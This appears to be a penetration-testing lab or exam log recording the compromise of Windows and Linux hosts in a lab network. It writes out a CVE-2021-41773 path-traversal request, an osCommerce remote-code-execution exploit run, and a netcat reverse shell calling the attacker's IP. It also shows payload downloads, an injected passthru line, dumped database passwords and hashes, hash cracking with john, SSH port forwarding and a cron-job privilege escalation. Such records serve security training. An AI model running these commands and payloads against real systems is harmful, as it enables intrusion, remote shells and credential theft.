  255.255.255.255  255.255.255.255         On-link   192.168.230.222    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.230.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

*Evil-WinRM* PS C:\Users\Administrator\Desktop> arp -A

Interface: 192.168.230.222 --- 0xb
  Internet Address      Physical Address      Type
  192.168.50.254        00-50-56-ab-36-31     dynamic
  192.168.230.254       00-50-56-ab-36-31     dynamic
  192.168.230.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static



				INTERESTING FILES:

*Evil-WinRM* PS C:\TFTP_SRV> ls
    Directory: C:\TFTP_SRV
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          1/2/2023   2:06 AM             79 backup.cfg
-a----        11/30/2022   1:46 PM           9216 sip-confg
-a----        11/30/2022   9:33 AM           5358 sip.cfg
-a----         12/1/2022   6:15 AM          22305 sip_327.cfg


*Evil-WinRM* PS C:\TFTP_SRV> cat sip_327.cfg

  <accounts>
    <account>
      <ident>Z834263d721f12beb302b8b2</ident>
      <name>reynolds@testing.com</name>
      <save_username>true</save_username>
      <username>reynolds</username>
      <save_password>true</save_password>
      <password>bj1ZzWEmJd870YHMsV+NdfsTuce+zsQRyvb7e5fIgY8=
</password>

    <port>5060</port>
    <port>8000</port>

reynolds
bj1ZzWEmJd870YHMsV+NdfsTuce+zsQRyvb7e5fIgY8=


-----------------------------------------------------------------------------------------
		192.168.154.223	Challenge 3 - VM 14 OS âœ…
HTTP: 80 TCP/UDP
HTTPS: 443 TCP/UDP

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.223

HTTP: 80 
80/tcp    closed http    conn-refused

HTTPS: 443
443/tcp   closed https   conn-refused
60001/tcp open   http    syn-ack      Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.223
80/udp  closed http
443/udp closed https
Running: Linux 2.6.X

			HTTPS: 443 TCP/UDP
http://192.168.154.223:60001/
Web servers
- Apache HTTP Server 2.4.41
Operating systems
- Ubuntu

	CVE-2021-41773 - Path Traversal & Remote Code Execution (RCE)
https://www.exploit-db.com/exploits/50383

curl -s --path-as-is http://192.168.154.223:60001/cgi-bin/%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2/etc/passwd

feroxbuster -u http://192.168.154.223:60001/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://192.168.154.223:60001/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

http://192.168.154.223:60001/index.html
http://192.168.154.223:60001/catalog/
http://192.168.154.223:60001/docs/

				/Etc/Hosts
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nano /etc/hosts
192.168.154.223	milan
192.168.223.223

feroxbuster -u http://milan:60001/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://milan:60001/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 


http://milan:60001/catalog/index.php
http://milan:60001/catalog/shopping_cart.php
http://milan:60001/catalog/login.php
http://milan:60001/catalog/create_account.php
http://milan:60001/catalog/products_new.php
http://milan:60001/catalog/advanced_search.php
http://milan:60001/catalog/product_info.php?products_id=30
http://milan:60001/catalog/product_info.php?products_id=29


			http://milan:60001/catalog/
feroxbuster -u http://milan:60001/catalog/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

http://milan:60001/catalog/login.php

http://milan:60001/catalog/includes/

http://milan:60001/catalog/install/includes/

http://milan:60001/catalog/install/


				EXPLOITS:
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ searchsploit osCommerce 2.3.4.1 
osCommerce 2.3.4.1 - 'currency' SQL Injection                   | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                 | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting    | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                      | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                      | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                  | php/webapps/50128.py


		osCommerce 2.3.4.1 - Remote Code Execution
https://www.exploit-db.com/exploits/44374
https://www.exploit-db.com/exploits/50128
https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution

http://192.168.154.223:60001/docs/CHANGELOG
08/18/2017 osCommerce Online Merchant v2.3.4.1

			# ALTERNTIVE: Github
https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ chmod +x osCommerce2_3_4RCE.py 

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ python3 osCommerce2_3_4RCE.py http://milan:60001/catalog/
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability

		# REVERSESHELL: https://www.revshells.com/

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ python3 osCommerce2_3_4RCE.py http://milan:60001/catalog/
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: RCE_SHELL$ busybox nc 192.168.45.241 443 -e sh

		# ALTERNTIVE: REVERSE SHELL UPLOAD
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ python3 -m http.server 80  

RCE_SHELL$ wget http://192.168.45.241:80/shell.php

# FIND DIRECTORY: 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ feroxbuster -u http://milan:60001/catalog/ -v
http://milan:60001/catalog/install/includes/
http://milan:60001/catalog/install/includes/shell.php

ALSO CHECK EXPLOIT CODE:
# readCMDUrl = baseUrl + '/install/includes/configure.php'

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.45.241] from (UNKNOWN) [192.168.154.223] 55708
Linux milan 5.15.0-52-generic #58~20.04.1-Ubuntu SMP Thu Oct 13 13:09:46 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 03:52:46 up  5:44,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python3 -c 'import pty; pty.spawn("/bin/bash")'


				LOCAL.txt
www-data@milan:/var/www$ hostname
milan

www-data@milan:/var/www$ history

www-data@milan:/var/www$ find / -name "local.txt" -ls 2> /dev/null
     8268      4 -rw-r--r--   1 root     root           33 May 13 22:12 /local.txt

www-data@milan:/var/www$ cat /local.txt
a515a92753783813621e9b962b515308


				NETWORK:
www-data@milan:/var/www$ ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.154.223  netmask 255.255.255.0  broadcast 192.168.154.255
        inet6 fe80::250:56ff:feab:c824  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ab:c8:24  txqueuelen 1000  (Ethernet)
        RX packets 2569098  bytes 390513903 (390.5 MB)
        RX errors 0  dropped 5498  overruns 0  frame 0
        TX packets 2273257  bytes 1111029771 (1.1 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 16853  bytes 2371666 (2.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16853  bytes 2371666 (2.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@milan:/var/www$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       milan
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


				PRIV ESC: proof.txt
www-data@milan:/var/www$ find / -name "proof.txt" -ls 2> /dev/null

www-data@milan:/var/www$ sudo -l
[sudo] password for www-data: 

www-data@milan:/$ sudo i
[sudo] password for www-data: 

www-data@milan:/$ sudo u
[sudo] password for www-data: 

www-data@milan:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 20 root root 4096 May 13 22:12 ..

# Files of interest
www-data@milan:/$ find / -name "*.zip" -ls 2> /dev/null
www-data@milan:/$ find / -name "*.git" -ls 2> /dev/null
www-data@milan:/$ find / -name "*.kdbx" -ls 2> /dev/null
www-data@milan:/$ find / -name â€œdoas.confâ€ 2>/dev/null

# LINPEAS
wget http://192.168.45.241:80/linpeas.sh
chmod +x linpeas.sh
./linpeas

â•”â•â•â•â•â•â•â•â•â•â•â•£ Sudo version
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                   
Sudo version 1.8.31  

â•”â•â•â•â•â•â•â•â•â•â•â•£ Executing Linux Exploit Suggester
â•š https://github.com/mzet-/linux-exploit-suggester                                                
cat: write error: Broken pipe                                                                     
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
[+] [CVE-2022-0847] DirtyPipe
   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Cron jobs
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs            
/usr/bin/crontab                                                                                  
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                          

/etc/cron.d:
total 40
drwxr-xr-x   2 root root  4096 Nov 18  2022 .
drwxr-xr-x 134 root root 12288 Dec  7  2022 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   285 Jul 16  2019 anacron
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r-----   1 root root   859 Nov 18  2022 froxlor
-rw-r--r--   1 root root   712 Mar 27  2020 php
-rw-r--r--   1 root root   191 Nov 14  2022 popularity-contest

â•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -   

â•”â•â•â•â•â•â•â•â•â•â•â•£ Users with console
milan:x:1000:1000:milan04,,,:/home/milan:/bin/bash                                                
root:x:0:0:root:/root:/bin/bash
sarah:x:1001:1001::/home/sarah:/bin/sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ MySQL version
mysql  Ver 15.1 Distrib 10.3.34-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2   

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Github Files (limit 70)
drwxr-xr-x 4 www-data www-data 4096 Oct 10  2021 /var/www/html/froxlor/.github 

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files
/var/www/html/froxlor/admin_configfiles.php:            '<SQL_UNPRIVILEGED_PASSWORD>' => 'FROXLOR_MYSQL_PASSWORD',
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_DATABASE', 'oscdb');
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_USERNAME', 'oscuser');
/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_DATABASE', 'oscdb');
/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');
/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_SERVER_USERNAME', 'oscuser');
/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_DATABASE', '');passthru('wget http://192.168.45.241:80/shell.php');/*');
/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_PASSWORD', '');
/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_USERNAME', '');


# DIRTYPIPE - DIDNT WORK 
wget http://192.168.45.241:80/dpipe
chmod +x dpipe
./dpipe --root
www-data@milan:/tmp$ su root 
su root 
Password: el3ph@nt! 
su: Authentication failure

# SUDO Version: Sudo version 1.8.31 - PATCHED
wget http://192.168.45.241:80/sudo-v.py
chmod +x sudo-v.py
www-data@milan:/tmp$ python3 sudo-v.py
python3 sudo-v.py
Traceback (most recent call last):
  File "sudo-v.py", line 220, in <module>
    assert check_is_vuln(), "target is patched"
AssertionError: target is patched

# SUID3NUM - NONE
wget http://192.168.45.241:80/suid3num.py
chmod +x suid3num.py
./suid3num.py
[~] Custom SUID Binaries (Interesting Stuff)                                                      
------------------------------                                                                    
------------------------------                                                                    
[#] SUID Binaries found in GTFO bins..                                                            
------------------------------                                                                    
[!] None :( 

				# MYSQL 
â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files
/var/www/html/froxlor/admin_configfiles.php:            '<SQL_UNPRIVILEGED_PASSWORD>' => 'FROXLOR_MYSQL_PASSWORD',
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_DATABASE', 'oscdb');
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Github Files (limit 70)
drwxr-xr-x 4 www-data www-data 4096 Oct 10  2021 /var/www/html/froxlor/.github 

www-data@milan:/var/www/html/froxlor$ ls -la                                                      
ls -la                                                                                            
total 672                                                                                         
drwxr-xr-x 15 www-data www-data   4096 Oct 10  2021 .                                             
drwxr-xr-x  4 root     root       4096 Nov 18  2022 ..                                            
drwxr-xr-x  4 www-data www-data   4096 Oct 10  2021 .github  

www-data@milan:/var/www/html/froxlor/.github$ ls -la                                              
ls -la                                                                                            
total 32                                                                                          
drwxr-xr-x  4 www-data www-data 4096 Oct 10  2021 .                                               
drwxr-xr-x 15 www-data www-data 4096 Oct 10  2021 ..                                              
-rwxr-xr-x  1 www-data www-data 1526 Oct 10  2021 CONTRIBUTING.md                                 
-rwxr-xr-x  1 www-data www-data   98 Oct 10  2021 FUNDING.yml                                     
drwxr-xr-x  2 www-data www-data 4096 Oct 10  2021 ISSUE_TEMPLATE                                  
-rwxr-xr-x  1 www-data www-data 1010 Oct 10  2021 ISSUE_TEMPLATE.md                               
-rwxr-xr-x  1 www-data www-data 1245 Oct 10  2021 PULL_REQUEST_TEMPLATE.md                        
drwxr-xr-x  2 www-data www-data 4096 Oct 10  2021 workflows 

www-data@milan:/var/www/html/froxlor/.github/workflows$ cat build-mariadb.yml  
- name: Setup MariaDB                                                                       
uses: getong/mariadb-action@v1.1                                                          
with:                                                                                     
mariadb version: ${{ matrix.mariadb-version }}                                          
mysql database: 'froxlor010'                                                            
mysql root password: 'fr0xl0r.TravisCI'  
- name: Setup databases                                                                     
run: |                                                                                    
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "CREATE USER 'froxlor010'@'%' IDENTIFIED BY 'fr0xl0r.TravisCI';"                                                          
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "GRANT ALL ON froxlor010.* TO 'froxlor010'@'%';"                                                                          
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI froxlor010 < install/froxlor.sql   

www-data@milan:/var/www/html/froxlor/.github/workflows$ cat build-mysql.yml
- name: Setup MySQL                                                                         
uses: samin/mysql-action@v1.3                                                             
with:                                                                                     
mysql version: ${{ matrix.mysql-version }}                                              
mysql database: 'froxlor010'                                                            
mysql root password: 'fr0xl0r.TravisCI'   
- name: Setup database (8.0)                                                                
if: matrix.mysql-version == '8.0'                                                         
run: |                                                                                    
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "CREATE USER 'froxlor010'@'%' IDENTIFIED WITH mysql_native_password BY 'fr0xl0r.TravisCI';"                               
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI -e "GRANT ALL ON froxlor010.* TO 'froxlor010'@'%';"                                                                          
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI froxlor010 < install/froxlor.sql    


www-data@milan:/var/www/html/froxlor/.github$ mysql -h 127.0.0.1 --protocol=TCP -u root -p7NVLVTDGJ38HM2TQ
<127.0.0.1 --protocol=TCP -u root -p7NVLVTDGJ38HM2TQ
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 260
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                                                   
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>    

# Inspecting the current session's user
MariaDB [(none)]> select system_user();
select system_user();
+----------------+
| system_user()  |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.000 sec)

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| froxlor            |
| information_schema |
| mysql              |
| oscdb              |
| performance_schema |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]> SELECT user, authentication_string FROM mysql.user WHERE user = 'root';
<er, authentication_string FROM mysql.user WHERE user = 'root';              
+------+-----------------------+
| user | authentication_string |
+------+-----------------------+
| root |                       |
+------+-----------------------+

MariaDB [(none)]> use froxlor;

MariaDB [froxlor]> show tables;
show tables;
+-----------------------+
| Tables_in_froxlor     |
+-----------------------+
| api_keys              |
| cronjobs_run          |
| domain_dns_entries    |
| domain_redirect_codes |
| domain_ssl_settings   |
| ftp_groups            |
| ftp_quotalimits       |
| ftp_quotatallies      |
| ftp_users             |
| mail_users            |
| mail_virtual          |
| panel_activation      |
| panel_admins          |
| panel_customers       |
| panel_databases       |
| panel_diskspace       |
| panel_domains         |
| panel_domaintoip      |
| panel_fpmdaemons      |
| panel_htaccess        |
| panel_htpasswds       |
| panel_ipsandports     |
| panel_languages       |
| panel_phpconfigs      |
| panel_plans           |
| panel_sessions        |
| panel_settings        |
| panel_syslog          |
| panel_tasks           |
| panel_templates       |
| panel_traffic         |
| panel_traffic_admins  |
| redirect_codes        |
+-----------------------+

use mysql; 
show tables;
MariaDB [mysql]> select * from user;
localhost      | root    | *1F6E42CCA3242391C9E93088889B1C729F9DFA34 
localhost      | oscuser | *1F6E42CCA3242391C9E93088889B1C729F9DFA34 
127.0.0.1      | froxlor | *3909730F3C8E584BBA98E1E0372D68BE78E63D44
localhost      | froxlor | *3909730F3C8E584BBA98E1E0372D68BE78E63D44
192.168.50.223 | froxlor | *3909730F3C8E584BBA98E1E0372D68BE78E63D44 


MariaDB [mysql]> use froxlor;
MariaDB [froxlor]> show tables;
MariaDB [froxlor]> select * from api_keys;
select * from api_keys;
Empty set (0.000 sec)

MariaDB [froxlor]> select * from ftp_users;
| id | username | uid   | gid   | password                                                        | homedir                      | shell      | login_enabled | login_count | last_login | up_count | up_bytes | down_count | down_bytes | customerid | description |
|  1 | Skylark  | 10000 | 10000 | $5$jigdYlfLyunlywsP$rYt3K4YQwFJvt3Fpq4ss31j9KF8o5Q8CVSa7/YXFRyC | /var/customers/webs/Skylark/ | /bin/false | Y             |           0 | NULL       |        0 |        0 |          0 |          0 |          1 | Default     |
|  2 | letsfly  | 10001 | 10001 | $5$enbUyVfzahjLdirm$29S4UqN3DcoeTp.AaCJKR0eZ45Z51c2zP4ndlw8aK14 | /var/customers/webs/letsfly/ | /bin/false | Y             |           0 | NULL       |        0 |        0 |          0 |          0 |          2 | Default     |
|  3 | flybike  | 10002 | 10002 | $5$egSnwzfaBdlswnAz$40euq6DBo8DjpoBnMzESWisyauMHST0yjbURPo0s2I5 | /var/customers/webs/flybike/ | /bin/false | Y             |           0 | NULL       |        0 |        0 |          0 |          0 |          3 | Default     |

MariaDB [froxlor]> select * from mail_users;
select * from mail_users;
Empty set (0.001 sec)

MariaDB [froxlor]> select * from panel_admins;
|       1 | admin     | $5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/ | Froxlor-Administrator | admin@milan | English

MariaDB [froxlor]> select * from panel_htpasswds;
|  1 |          1 | /var/customers/webs/Skylark/webalizer/ | Skylark  | {SHA}d6l/XOhQlD8FaxZuu5eaeN41PQk= | Restricted Area |
|  2 |          2 | /var/customers/webs/letsfly/webalizer/ | letsfly  | {SHA}ZFqXgW++nFI6Nj7KzakqFHpyGSY= | Restricted Area |
|  3 |          3 | /var/customers/webs/flybike/webalizer/ | flybike  | {SHA}osIrrKFYYsLwUj/nCQG/5e9gITo= | Restricted Area |


MariaDB [froxlor]> use oscdb;
MariaDB [oscdb]> show tables;

MariaDB [oscdb]> select * from administrators;
select * from administrators;
+----+-----------+------------------------------------+
| id | user_name | user_password                      |
+----+-----------+------------------------------------+
|  1 | admin     | $P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 |
+----+-----------+------------------------------------+

# Get a shell with the mysql client user
MariaDB [froxlor]> \! sh      


			USERS / PASSWORDS:
froxlor010:fr0xl0r.TravisCI
root:7NVLVTDGJ38HM2TQ

admin:$P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0
admin:$5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/

Skylark:$5$jigdYlfLyunlywsP$rYt3K4YQwFJvt3Fpq4ss31j9KF8o5Q8CVSa7/YXFRyC
Skylark:{SHA}d6l/XOhQlD8FaxZuu5eaeN41PQk=

letsfly:$5$enbUyVfzahjLdirm$29S4UqN3DcoeTp.AaCJKR0eZ45Z51c2zP4ndlw8aK14
letsfly:{SHA}ZFqXgW++nFI6Nj7KzakqFHpyGSY=

flybike:$5$egSnwzfaBdlswnAz$40euq6DBo8DjpoBnMzESWisyauMHST0yjbURPo0s2I5
flybike:{SHA}osIrrKFYYsLwUj/nCQG/5e9gITo=

localhost      | root    | 1F6E42CCA3242391C9E93088889B1C729F9DFA34 
localhost      | oscuser | 1F6E42CCA3242391C9E93088889B1C729F9DFA34 

127.0.0.1      | froxlor | 3909730F3C8E584BBA98E1E0372D68BE78E63D44
localhost      | froxlor | 3909730F3C8E584BBA98E1E0372D68BE78E63D44
192.168.50.223 | froxlor | 3909730F3C8E584BBA98E1E0372D68BE78E63D44 

# panel_customers table 
Skylark   | $5$wpqNdybSegkaxdZq$iCXcCM54l4Qig25b5RT5wvEPhbJ/7pioFsFsbSZ0JyC | skylark@skylarc.local 
letsfly   | $5$NBzpteuosadgzxAw$NM1Jqt7N4j8TtUYyBff1S03Nbc2IQCeqOGsFgwqQQS2 | airborne@skylark.local 
flybike   | $5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2 | sarah@skylark.local

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ john -w=/usr/share/wordlists/rockyou.txt flybike.hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Christopher      (?)     

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ john -w=/usr/share/wordlists/rockyou.txt skylark.hash 

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/223]
â””â”€$ john -w=/usr/share/wordlists/rockyou.txt letsfly.hash 


			OPTION 1: SEARCH EXPLOIT
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ searchsploit Froxlor           
Froxlor 0.10.29.1 - SQL Injection (Authenticated)               | php/webapps/50502.txt
Froxlor 0.9.15 - Remote File Inclusion                          | php/webapps/16051.txt
Froxlor 2.0.3 Stable - Remote Code Execution (RCE)              | php/webapps/51263.py
Froxlor Froxlor Server Management Panel 0.10.16 - Persistent Cr | php/webapps/49063.txt
Froxlor Server Management Panel 0.9.33.1 - MySQL Login Informat | php/webapps/37725.txt

			PORT FORWARD:
I know port 60002 is running locally and I pivoted with ssh 

$ ss -ntplu
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:5353         0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:52679        0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:631          0.0.0.0:*            
udp    UNCONN  0       0                 [::]:5353            [::]:*            
udp    UNCONN  0       0                 [::]:38457           [::]:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       5            127.0.0.1:631          0.0.0.0:*            
tcp    LISTEN  0       80           127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22              [::]:*            
tcp    LISTEN  0       5                [::1]:631             [::]:*            
tcp    LISTEN  0       511                  *:60001              *:*            
tcp    LISTEN  0       511                  *:60002              *:*  
 
# SSH remote port forward 
kali@kali:~$ sudo systemctl start ssh
www-data@milan:/$ ssh -R *:60002:localhost:60002 kali@192.168.45.241

http://127.0.0.1:60002
flybike:Christopher

	CVE-2021-42325 - Froxlor 0.10.29.1 - SQL Injection (Authenticated)
               	https://www.exploit-db.com/exploits/50502


			OPTION 2: CRON JOB 
I inserted the reverse shell payload in the froxlor_master_cronjob.php file and i got root access  

â•”â•â•â•â•â•â•â•â•â•â•â•£ Cron jobs
